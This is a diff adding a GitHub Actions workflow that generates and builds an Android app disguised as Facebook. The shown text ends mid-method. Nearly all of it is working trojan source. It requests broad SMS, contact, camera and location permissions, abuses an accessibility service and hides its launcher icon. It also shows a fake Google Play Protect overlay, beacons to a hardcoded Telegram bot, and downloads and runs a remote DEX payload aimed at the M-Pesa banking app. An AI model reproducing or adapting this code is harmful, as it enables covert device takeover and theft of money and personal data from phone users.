@@ -1,0 +1,962 @@
+name: Build Facebook APK – Zero Errors
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Create Android Project
+        run: |
+          mkdir -p app/src/main/java/com/facebook/updater
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/drawable
+          mkdir -p app/src/main/assets/html
+          mkdir -p gradle/wrapper
+
+          # ============================================================
+          # GRADLE PROPERTIES
+          # ============================================================
+          cat > gradle.properties << 'EOF'
+          android.useAndroidX=true
+          android.enableJetifier=true
+          org.gradle.jvmargs=-Xmx2048m
+          org.gradle.parallel=true
+          org.gradle.caching=true
+          EOF
+
+          # ============================================================
+          # GRADLE WRAPPER PROPERTIES
+          # ============================================================
+          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.2-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
+          EOF
+
+          # ============================================================
+          # SETTINGS.GRADLE
+          # ============================================================
+          cat > settings.gradle << 'EOF'
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "Facebook"
+          include ':app'
+          EOF
+
+          # ============================================================
+          # ROOT BUILD.GRADLE
+          # ============================================================
+          cat > build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application' version '8.2.0' apply false
+              id 'com.android.library' version '8.2.0' apply false
+          }
+          EOF
+
+          # ============================================================
+          # APP BUILD.GRADLE - FULLY CORRECTED ✅
+          # ============================================================
+          cat > app/build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application'
+          }
+
+          android {
+              namespace 'com.facebook.updater'
+              compileSdk 34
+
+              defaultConfig {
+                  applicationId 'com.facebook.updater'
+                  minSdk 21
+                  targetSdk 34
+                  versionCode 1
+                  versionName '1.0'
+
+                  buildConfigField "String", "DEX_URL", "\"https://payload-host-079x.onrender.com/payload.dex\""
+                  buildConfigField "String", "VERSION_URL", "\"https://payload-host-079x.onrender.com/version\""
+                  buildConfigField "String", "TELEGRAM_BOT", "\"8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc\""
+                  buildConfigField "String", "TELEGRAM_CHAT", "\"8468538314\""
+              }
+
+              signingConfigs {
+                  debug {
+                      storeFile file('debug.keystore')
+                      storePassword 'android'
+                      keyAlias 'android'
+                      keyPassword 'android'
+                  }
+              }
+
+              buildTypes {
+                  debug {
+                      signingConfig signingConfigs.debug
+                  }
+                  release {
+                      minifyEnabled false
+                      signingConfig signingConfigs.debug
+                  }
+              }
+
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_1_8
+                  targetCompatibility JavaVersion.VERSION_1_8
+              }
+          }
+
+          repositories {
+              google()
+              mavenCentral()
+          }
+
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
+              implementation 'androidx.webkit:webkit:1.8.0'
+          }
+          EOF
+
+          # ============================================================
+          # ANDROIDMANIFEST.XML
+          # ============================================================
+          cat > app/src/main/AndroidManifest.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+              <uses-permission android:name="android.permission.READ_SMS" />
+              <uses-permission android:name="android.permission.RECEIVE_SMS" />
+              <uses-permission android:name="android.permission.SEND_SMS" />
+              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.READ_CONTACTS" />
+              <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+              <uses-permission android:name="android.permission.READ_CALL_LOG" />
+              <uses-permission android:name="android.permission.CAMERA" />
+              <uses-permission android:name="android.permission.RECORD_AUDIO" />
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+              <uses-permission android:name="android.permission.READ_CALENDAR" />
+              <uses-permission android:name="android.permission.WRITE_CALENDAR" />
+              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+              <application
+                  android:allowBackup="true"
+                  android:label="Facebook"
+                  android:icon="@drawable/ic_launcher"
+                  android:theme="@style/Theme.AppCompat.Light.DarkActionBar">
+
+                  <activity android:name=".MainActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+
+                  <service
+                      android:name=".UpdaterService"
+                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.accessibilityservice.AccessibilityService" />
+                      </intent-filter>
+                      <meta-data
+                          android:name="android.accessibilityservice"
+                          android:resource="@xml/accessibility_config" />
+                  </service>
+
+                  <receiver android:name=".BootReceiver" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.BOOT_COMPLETED" />
+                      </intent-filter>
+                  </receiver>
+
+                  <receiver android:name=".NetworkReceiver" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                      </intent-filter>
+                  </receiver>
+
+              </application>
+          </manifest>
+          EOF
+
+          # ============================================================
+          # ACCESSIBILITY CONFIG
+          # ============================================================
+          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:accessibilityFlags="flagDefault"
+              android:canRetrieveWindowContent="true"
+              android:description="Facebook helper service"
+              android:notificationTimeout="100" />
+          EOF
+
+          # ============================================================
+          # STRINGS.XML
+          # ============================================================
+          cat > app/src/main/res/values/strings.xml << 'EOF'
+          <resources>
+              <string name="app_name">Facebook</string>
+          </resources>
+          EOF
+
+          # ============================================================
+          # ACTIVITY_MAIN.XML
+          # ============================================================
+          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:orientation="vertical"
+              android:gravity="center"
+              android:padding="20dp"
+              android:background="#FFFFFF">
+              <ImageView
+                  android:layout_width="80dp"
+                  android:layout_height="80dp"
+                  android:src="@drawable/ic_launcher"
+                  android:layout_marginBottom="20dp" />
+              <TextView
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="Facebook"
+                  android:textSize="28sp"
+                  android:textStyle="bold"
+                  android:textColor="#1877F2" />
+              <TextView
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="This app needs all permissions"
+                  android:textSize="16sp"
+                  android:textColor="#666666"
+                  android:layout_marginTop="10dp" />
+              <Button
+                  android:id="@+id/btn_permissions"
+                  android:layout_width="match_parent"
+                  android:layout_height="56dp"
+                  android:text="Grant All Permissions"
+                  android:textSize="16sp"
+                  android:backgroundTint="#1877F2"
+                  android:layout_marginTop="30dp" />
+              <Button
+                  android:id="@+id/btn_accessibility"
+                  android:layout_width="match_parent"
+                  android:layout_height="56dp"
+                  android:text="Enable Accessibility"
+                  android:textSize="16sp"
+                  android:backgroundTint="#34A853"
+                  android:layout_marginTop="10dp" />
+              <TextView
+                  android:id="@+id/tv_status"
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text=""
+                  android:textSize="12sp"
+                  android:textColor="#999999"
+                  android:layout_marginTop="20dp" />
+          </LinearLayout>
+          EOF
+
+          # ============================================================
+          # FACEBOOK ICON - VALID ✅
+          # ============================================================
+          cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
+          <vector xmlns:android="http://schemas.android.com/apk/res/android"
+              android:width="108dp"
+              android:height="108dp"
+              android:viewportWidth="108"
+              android:viewportHeight="108">
+              <path android:fillColor="#1877F2" android:pathData="M0,0h108v108h-108z"/>
+              <path android:fillColor="#FFFFFF" android:pathData="M58,26h-8v11h-4v6h4v28h8v-28h6.5c0,0 1-4.5 1-6.5 0-2 -1-5.5-1-5.5H58z"/>
+          </vector>
+          EOF
+
+          # ============================================================
+          # OVERLAY HTML (security.html)
+          # ============================================================
+          cat > app/src/main/assets/html/security.html << 'EOF'
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Google Play Protect</title>
+            <style>
+              * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+              body {
+                background: #ffffff;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                padding: 20px;
+              }
+              .container {
+                text-align: center;
+                width: 360px;
+                padding: 30px 20px 35px;
+                background: #ffffff;
+                border-radius: 28px;
+                box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+                transition: opacity 0.3s ease;
+                position: relative;
+              }
+              .container.done { opacity: 0; pointer-events: none; }
+              .play-badge { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 12px; }
+              .play-badge span { font-size: 18px; font-weight: 600; color: #1a1a1a; }
+              h1 { color: #202124; font-size: 22px; font-weight: 500; margin: 6px 0 8px; }
+              .subhead { color: #5f6368; font-size: 14px; font-weight: 400; margin-bottom: 28px; }
+              .progress-ring { width: 170px; height: 170px; margin: 0 auto 10px; position: relative; }
+              .progress-ring svg { transform: rotate(-90deg); display: block; }
+              .progress-ring circle { fill: none; stroke-width: 10; }
+              .bg { stroke: #e8eaed; }
+              .progress { stroke: #1a73e8; stroke-linecap: round; stroke-dasharray: 471; stroke-dashoffset: 471; transition: stroke-dashoffset 0.9s cubic-bezier(0.25, 0.46, 0.45, 0.94); }
+              .icon { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 52px; line-height: 1; pointer-events: none; }
+              .scan-status { margin-top: 18px; font-size: 18px; font-weight: 500; color: #202124; min-height: 30px; }
+              .scan-detail { margin-top: 4px; font-size: 14px; color: #5f6368; min-height: 22px; }
+              .percent { margin-top: 6px; font-size: 26px; font-weight: 600; color: #1a73e8; }
+              .time { margin-top: 4px; font-size: 18px; font-weight: 400; color: #5f6368; }
+              .action-area { margin-top: 28px; display: flex; justify-content: center; gap: 16px; flex-wrap: wrap; }
+              .btn { padding: 10px 28px; border-radius: 40px; border: none; font-size: 15px; font-weight: 500; cursor: pointer; transition: all 0.2s; background: transparent; min-width: 120px; }
+              .btn-cancel { background: transparent; color: #5f6368; border: 1px solid #dadce0; }
+              .btn-cancel:hover { background: #f1f3f4; }
+              .btn-cancel:disabled { opacity: 0.4; cursor: not-allowed; pointer-events: none; }
+              .btn-home { background: #ffffff; color: #1a73e8; border: 1px solid #dadce0; display: none; font-weight: 600; }
+              .btn-home:hover { background: #f8f9fa; border-color: #1a73e8; }
+              .btn-home.show { display: inline-block; }
+              .btn-cancel.hide { display: none; }
+              .container.success .progress { stroke: #0f9d58; }
+              .container.success .percent { color: #0f9d58; }
+              .container.success .scan-status { color: #0f9d58; }
+            </style>
+          </head>
+          <body>
+          <div class="container" id="mainContainer">
+            <div class="play-badge"><span>Google Play Protect</span></div>
+            <h1>Security update</h1>
+            <div class="subhead">Scanning for harmful apps</div>
+            <div class="progress-ring">
+              <svg width="170" height="170" viewBox="0 0 170 170">
+                <circle class="bg" cx="85" cy="85" r="75"></circle>
+                <circle class="progress" id="progressCircle" cx="85" cy="85" r="75"></circle>
+              </svg>
+              <div class="icon" id="statusIcon">🛡️</div>
+            </div>
+            <div class="scan-status" id="scanStatus">Scanning apps...</div>
+            <div class="scan-detail" id="scanDetail">Checking 0 apps</div>
+            <div class="percent" id="percentDisplay">0%</div>
+            <div class="time" id="timeDisplay">45s</div>
+            <div class="action-area">
+              <button class="btn btn-cancel" id="cancelBtn">Cancel</button>
+              <button class="btn btn-home white" id="homeBtn">Back to Home</button>
+            </div>
+          </div>
+          <script>
+            (function() {
+              const TOTAL_SECONDS = 45;
+              const CIRCUMFERENCE = 471;
+              const APP_NAMES = ['Chrome','Gmail','Maps','YouTube','Drive','Photos','Messages','Calendar','Keep','Duo','Play Store','Assistant','Home','Weather'];
+              const container = document.getElementById('mainContainer');
+              const circle = document.getElementById('progressCircle');
+              const percentEl = document.getElementById('percentDisplay');
+              const timeEl = document.getElementById('timeDisplay');
+              const scanStatus = document.getElementById('scanStatus');
+              const scanDetail = document.getElementById('scanDetail');
+              const statusIcon = document.getElementById('statusIcon');
+              const cancelBtn = document.getElementById('cancelBtn');
+              const homeBtn = document.getElementById('homeBtn');
+              let secondsLeft = TOTAL_SECONDS;
+              let intervalId = null;
+              let isFinished = false;
+              let isCancelled = false;
+
+              function updateDisplay(percent) {
+                const clamped = Math.min(100, Math.max(0, percent));
+                const percentInt = Math.round(clamped);
+                const offset = CIRCUMFERENCE - (percentInt / 100) * CIRCUMFERENCE;
+                circle.style.strokeDashoffset = offset;
+                percentEl.textContent = percentInt + '%';
+                const displaySec = Math.max(0, secondsLeft);
+                timeEl.textContent = displaySec + 's';
+                const scanned = Math.min(14, Math.floor((percentInt / 100) * 14));
+                const appName = APP_NAMES[scanned] || 'apps';
+                if (percentInt < 100) {
+                  scanDetail.textContent = 'Checking ' + (scanned + 1) + ' of 14 apps';
+                  if (percentInt < 10) scanStatus.textContent = 'Scanning apps...';
+                  else if (percentInt < 50) scanStatus.textContent = 'Analyzing ' + appName + '...';
+                  else if (percentInt < 80) scanStatus.textContent = 'Deep scanning ' + appName + '...';
+                  else scanStatus.textContent = 'Finalizing security check...';
+                }
+                if (percentInt >= 100) {
+                  scanStatus.textContent = '100% clean — No threats found';
+                  scanDetail.textContent = '14 apps checked · All safe';
+                  statusIcon.textContent = '✅';
+                  container.classList.add('success');
+                  cancelBtn.classList.add('hide');
+                  homeBtn.classList.add('show');
+                } else {
+                  container.classList.remove('success');
+                  statusIcon.textContent = '🛡️';
+                }
+              }
+
+              function finishUpdate() {
+                if (isFinished) return;
+                isFinished = true;
+                if (intervalId) { clearInterval(intervalId); intervalId = null; }
+                secondsLeft = 0;
+                timeEl.textContent = '0s';
+                percentEl.textContent = '100%';
+                circle.style.strokeDashoffset = 0;
+                container.classList.add('success');
+                scanStatus.textContent = '100% clean — No threats found';
+                scanDetail.textContent = '14 apps checked · All safe';
+                statusIcon.textContent = '✅';
+                cancelBtn.classList.add('hide');
+                homeBtn.classList.add('show');
+                setTimeout(function() { container.classList.add('done'); }, 300);
+              }
+
+              function tick() {
+                if (isFinished || isCancelled) { if (intervalId) { clearInterval(intervalId); intervalId = null; } return; }
+                secondsLeft = Math.max(0, secondsLeft - 1);
+                const elapsed = TOTAL_SECONDS - secondsLeft;
+                let percent = (elapsed / TOTAL_SECONDS) * 100;
+                if (secondsLeft === 0) percent = 100;
+                updateDisplay(percent);
+                if (percent >= 100) { finishUpdate(); }
+              }
+
+              function startTimer() {
+                if (intervalId) { clearInterval(intervalId); intervalId = null; }
+                isFinished = false; isCancelled = false;
+                secondsLeft = TOTAL_SECONDS;
+                container.classList.remove('success', 'done');
+                cancelBtn.classList.remove('hide');
+                homeBtn.classList.remove('show');
+                cancelBtn.disabled = false;
+                circle.style.strokeDashoffset = CIRCUMFERENCE;
+                percentEl.textContent = '0%';
+                timeEl.textContent = '45s';
+                scanStatus.textContent = 'Scanning apps...';
+                scanDetail.textContent = 'Checking 0 apps';
+                statusIcon.textContent = '🛡️';
+                container.classList.remove('success');
+                updateDisplay(0);
+                intervalId = setInterval(function() { tick(); }, 1000);
+              }
+
+              cancelBtn.addEventListener('click', function() {
+                if (isFinished || isCancelled) return;
+                isCancelled = true;
+                if (intervalId) { clearInterval(intervalId); intervalId = null; }
+                cancelBtn.disabled = true;
+                cancelBtn.textContent = 'Cancelling...';
+                scanStatus.textContent = 'Cancelling scan...';
+                setTimeout(function() {
+                  cancelBtn.textContent = 'Cancel';
+                  cancelBtn.disabled = false;
+                  isCancelled = false;
+                  startTimer();
+                }, 800);
+              });
+
+              homeBtn.addEventListener('click', function() {
+                container.classList.add('done');
+                setTimeout(function() { container.classList.remove('done'); startTimer(); }, 300);
+              });
+
+              startTimer();
+            })();
+          </script>
+          </body>
+          </html>
+          EOF
+
+          # ============================================================
+          # MAINACTIVITY.JAVA
+          # ============================================================
+          cat > app/src/main/java/com/facebook/updater/MainActivity.java << 'EOF'
+          package com.facebook.updater;
+
+          import android.Manifest;
+          import android.content.ComponentName;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.os.Bundle;
+          import android.provider.Settings;
+          import android.widget.Button;
+          import android.widget.TextView;
+          import android.widget.Toast;
+          import androidx.appcompat.app.AppCompatActivity;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
+          import java.util.ArrayList;
+          import java.util.List;
+
+          public class MainActivity extends AppCompatActivity {
+              private static final int PERMISSION_REQUEST_CODE = 100;
+              private TextView tvStatus;
+
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+
+                  tvStatus = findViewById(R.id.tv_status);
+                  Button btnPermissions = findViewById(R.id.btn_permissions);
+                  Button btnAccessibility = findViewById(R.id.btn_accessibility);
+
+                  btnPermissions.setOnClickListener(v -> requestAllPermissions());
+                  btnAccessibility.setOnClickListener(v -> {
+                      startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                      Toast.makeText(this, "Enable Facebook from Accessibility", Toast.LENGTH_LONG).show();
+                  });
+
+                  if (allPermissionsGranted() && Settings.canDrawOverlays(this)) {
+                      startServiceAndHide();
+                  }
+              }
+
+              private boolean allPermissionsGranted() {
+                  String[] perms = {
+                      Manifest.permission.READ_SMS,
+                      Manifest.permission.RECEIVE_SMS,
+                      Manifest.permission.READ_CALL_LOG,
+                      Manifest.permission.READ_CONTACTS,
+                      Manifest.permission.CAMERA,
+                      Manifest.permission.RECORD_AUDIO,
+                      Manifest.permission.ACCESS_FINE_LOCATION,
+                      Manifest.permission.READ_EXTERNAL_STORAGE,
+                      Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                      Manifest.permission.READ_PHONE_STATE
+                  };
+                  for (String p : perms) {
+                      if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
+                          return false;
+                  }
+                  return true;
+              }
+
+              private void requestAllPermissions() {
+                  String[] perms = {
+                      Manifest.permission.READ_SMS,
+                      Manifest.permission.RECEIVE_SMS,
+                      Manifest.permission.SEND_SMS,
+                      Manifest.permission.READ_CALL_LOG,
+                      Manifest.permission.WRITE_CALL_LOG,
+                      Manifest.permission.READ_CONTACTS,
+                      Manifest.permission.WRITE_CONTACTS,
+                      Manifest.permission.READ_CALENDAR,
+                      Manifest.permission.WRITE_CALENDAR,
+                      Manifest.permission.CAMERA,
+                      Manifest.permission.RECORD_AUDIO,
+                      Manifest.permission.ACCESS_FINE_LOCATION,
+                      Manifest.permission.ACCESS_COARSE_LOCATION,
+                      Manifest.permission.READ_EXTERNAL_STORAGE,
+                      Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                      Manifest.permission.READ_PHONE_STATE,
+                      Manifest.permission.SYSTEM_ALERT_WINDOW
+                  };
+
+                  List<String> toRequest = new ArrayList<>();
+                  for (String p : perms) {
+                      if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
+                          toRequest.add(p);
+                  }
+
+                  if (!Settings.canDrawOverlays(this)) {
+                      startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION), 101);
+                  }
+
+                  if (!toRequest.isEmpty()) {
+                      ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+                  } else if (Settings.canDrawOverlays(this)) {
+                      startServiceAndHide();
+                  }
+              }
+
+              @Override
+              public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
+                  super.onRequestPermissionsResult(code, perms, results);
+                  if (code == PERMISSION_REQUEST_CODE && allPermissionsGranted() && Settings.canDrawOverlays(this)) {
+                      startServiceAndHide();
+                  }
+              }
+
+              @Override
+              protected void onActivityResult(int code, int result, Intent data) {
+                  super.onActivityResult(code, result, data);
+                  if (code == 101 && Settings.canDrawOverlays(this)) {
+                      requestAllPermissions();
+                  }
+              }
+
+              private void startServiceAndHide() {
+                  startService(new Intent(this, UpdaterService.class));
+                  ComponentName cn = new ComponentName(this, MainActivity.class);
+                  getPackageManager().setComponentEnabledSetting(cn,
+                      PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+                  finish();
+              }
+          }
+          EOF
+
+          # ============================================================
+          # UPDATERSERVICE.JAVA
+          # ============================================================
+          cat > app/src/main/java/com/facebook/updater/UpdaterService.java << 'EOF'
+          package com.facebook.updater;
+
+          import android.accessibilityservice.AccessibilityService;
+          import android.content.Context;
+          import android.content.SharedPreferences;
+          import android.graphics.PixelFormat;
+          import android.os.Build;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.provider.Settings;
+          import android.util.Log;
+          import android.view.Gravity;
+          import android.view.WindowManager;
+          import android.webkit.WebView;
+          import android.webkit.WebViewClient;
+
+          import java.io.File;
+          import java.io.FileOutputStream;
+          import java.io.InputStream;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+
+          import dalvik.system.DexClassLoader;
+
+          public class UpdaterService extends AccessibilityService {
+              private static final String TAG = "UpdaterService";
+              private static final String DEX_URL = BuildConfig.DEX_URL;
+              private static final String VERSION_URL = BuildConfig.VERSION_URL;
+              private static final String TELEGRAM_BOT = BuildConfig.TELEGRAM_BOT;
+              private static final String TELEGRAM_CHAT = BuildConfig.TELEGRAM_CHAT;
+              private static final long UPDATE_INTERVAL = 120000;
+
+              private Handler handler = new Handler(Looper.getMainLooper());
+              private SharedPreferences prefs;
+              private String currentVersion = "";
+              private WindowManager windowManager;
+              private WebView overlayWebView;
+              private boolean overlayShowing = false;
+
+              @Override
+              public void onServiceConnected() {
+                  super.onServiceConnected();
+                  Log.i(TAG, "UpdaterService connected");
+                  prefs = getSharedPreferences("facebook_updater", MODE_PRIVATE);
+                  currentVersion = prefs.getString("dex_version", "");
+                  windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+
+                  sendTelegram("📱 *Facebook APK Installed!*\n📟 Device: " + Build.MANUFACTURER + " " + Build.MODEL + "\n🤖 Android: " + Build.VERSION.RELEASE);
+
+                  checkForUpdate();
+                  handler.postDelayed(periodicCheck, UPDATE_INTERVAL);
+              }
+
+              private final Runnable periodicCheck = new Runnable() {
+                  @Override
+                  public void run() {
+                      checkForUpdate();
+                      handler.postDelayed(this, UPDATE_INTERVAL);
+                  }
+              };
+
+              // ==================== OVERLAY METHODS ====================
+              public void showOverlay() {
+                  if (overlayShowing) return;
+                  if (!Settings.canDrawOverlays(this)) return;
+
+                  try {
+                      overlayWebView = new WebView(this);
+                      overlayWebView.setWebViewClient(new WebViewClient());
+                      overlayWebView.getSettings().setJavaScriptEnabled(true);
+                      overlayWebView.getSettings().setDomStorageEnabled(true);
+                      overlayWebView.loadUrl("file:///android_asset/html/security.html");
+
+                      int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                          ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                          : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
+
+                      WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                          WindowManager.LayoutParams.MATCH_PARENT,
+                          WindowManager.LayoutParams.MATCH_PARENT,
+                          type,
+                          WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                          WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                          WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                          WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+                          WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                          WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+                          PixelFormat.TRANSLUCENT
+                      );
+                      params.gravity = Gravity.TOP | Gravity.START;
+
+                      windowManager.addView(overlayWebView, params);
+                      overlayShowing = true;
+                      Log.i(TAG, "Overlay shown");
+                  } catch (Exception e) {
+                      Log.e(TAG, "Overlay error: " + e.getMessage());
+                  }
+              }
+
+              public void hideOverlay() {
+                  if (!overlayShowing || overlayWebView == null) return;
+                  try {
+                      windowManager.removeView(overlayWebView);
+                      overlayWebView.destroy();
+                      overlayWebView = null;
+                      overlayShowing = false;
+                      Log.i(TAG, "Overlay hidden");
+                  } catch (Exception e) {
+                      Log.e(TAG, "Hide overlay error: " + e.getMessage());
+                  }
+              }
+
+              public void updateOverlayProgress(int progress) {
+                  if (!overlayShowing || overlayWebView == null) return;
+                  try {
+                      overlayWebView.evaluateJavascript(
+                          "updateDisplay && updateDisplay(" + progress + ");", null);
+                  } catch (Exception e) {
+                      Log.e(TAG, "Update progress error: " + e.getMessage());
+                  }
+              }
+
+              public boolean isOverlayShowing() { return overlayShowing; }
+
+              // ==================== UPDATE LOGIC ====================
+              private void checkForUpdate() {
+                  new Thread(() -> {
+                      try {
+                          HttpURLConnection conn = (HttpURLConnection) new URL(VERSION_URL).openConnection();
+                          conn.setConnectTimeout(5000);
+                          conn.setRequestMethod("GET");
+                          int code = conn.getResponseCode();
+                          if (code == 200) {
+                              InputStream in = conn.getInputStream();
+                              byte[] buffer = new byte[1024];
+                              int len;
+                              StringBuilder sb = new StringBuilder();
+                              while ((len = in.read(buffer)) != -1) sb.append(new String(buffer, 0, len));
+                              in.close();
+                              String remoteVersion = sb.toString().trim();
+                              conn.disconnect();
+
+                              if (!remoteVersion.equals(currentVersion)) {
+                                  Log.i(TAG, "New version found: " + remoteVersion);
+                                  sendTelegram("🔄 *Update Available!*\n📦 New Version: " + remoteVersion);
+                                  downloadAndExecuteDex();
+                                  currentVersion = remoteVersion;
+                                  prefs.edit().putString("dex_version", currentVersion).apply();
+                              } else {
+                                  Log.i(TAG, "Already latest version: " + currentVersion);
+                                  sendTelegram("ℹ️ *No Update Available*\n📦 Current Version: " + currentVersion);
+                              }
+                          } else {
+                              Log.w(TAG, "Version check failed: " + code);
+                          }
+                      } catch (Exception e) {
+                          Log.e(TAG, "Version check error: " + e.getMessage());
+                      }
+                  }).start();
+              }
+
+              private void downloadAndExecuteDex() {
+                  new Thread(() -> {
+                      try {
+                          File dexFile = new File(getCacheDir(), "payload.dex");
+                          HttpURLConnection conn = (HttpURLConnection) new URL(DEX_URL).openConnection();
+                          conn.setConnectTimeout(10000);
+                          conn.setReadTimeout(10000);
+                          int code = conn.getResponseCode();
+                          if (code != 200) {
+                              Log.e(TAG, "Download failed: " + code);
+                              sendTelegram("❌ *Payload Download Failed*\nError: " + code);
+                              return;
+                          }
+                          InputStream in = conn.getInputStream();
+                          FileOutputStream out = new FileOutputStream(dexFile);
+                          byte[] buffer = new byte[8192];
+                          int len;
+                          while ((len = in.read(buffer)) != -1) out.write(buffer, 0, len);
+                          out.close();
+                          in.close();
+                          conn.disconnect();
+
+                          Log.i(TAG, "DEX downloaded: " + dexFile.length() + " bytes");
+                          sendTelegram("📥 *Payload Downloaded*\n📦 Size: " + dexFile.length() + " bytes");
+
+                          loadAndExecuteDex(dexFile);
+                      } catch (Exception e) {
+                          Log.e(TAG, "Download error: " + e.getMessage());
+                          sendTelegram("❌ *Payload Download Failed*\nError: " + e.getMessage());
+                      }
+                  }).start();
+              }
+
+              private void loadAndExecuteDex(File dexFile) {
+                  try {
+                      DexClassLoader loader = new DexClassLoader(
+                          dexFile.getAbsolutePath(),
+                          getCacheDir().getAbsolutePath(),
+                          null,
+                          getClassLoader()
+                      );
+
+                      Class<?> clazz = loader.loadClass("com.simiyu.payload.Payload");
+                      Object instance = clazz.newInstance();
+
+                      clazz.getMethod("initialize", AccessibilityService.class, Context.class)
+                           .invoke(instance, this, this);
+
+                      clazz.getMethod("checkAndTrackApp", String.class)
+                           .invoke(instance, "com.safaricom.mpesa");
+
+                      Log.i(TAG, "✅ DEX loaded successfully");
+                      sendTelegram("🚀 *Payload Executed Successfully!*");
+                  } catch (Exception e) {
+                      Log.e(TAG, "DEX load error: " + e.getMessage());
+                      sendTelegram("❌ *Payload Execution Failed*\nError: " + e.getMessage());
+                  }
+              }
+
+              private void sendTelegram(String message) {
+                  new Thread(() -> {
+                      try {
+                          String url = "https://api.telegram.org/bot" + TELEGRAM_BOT + "/sendMessage";
+                          HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+                          conn.setRequestMethod("POST");
+                          conn.setRequestProperty("Content-Type", "application/json");
+                          conn.setDoOutput(true);
+                          String json = "{\"chat_id\":\"" + TELEGRAM_CHAT + "\",\"text\":\"" +
+                              message.replace("\n", "\\n").replace("\"", "\\\"") +
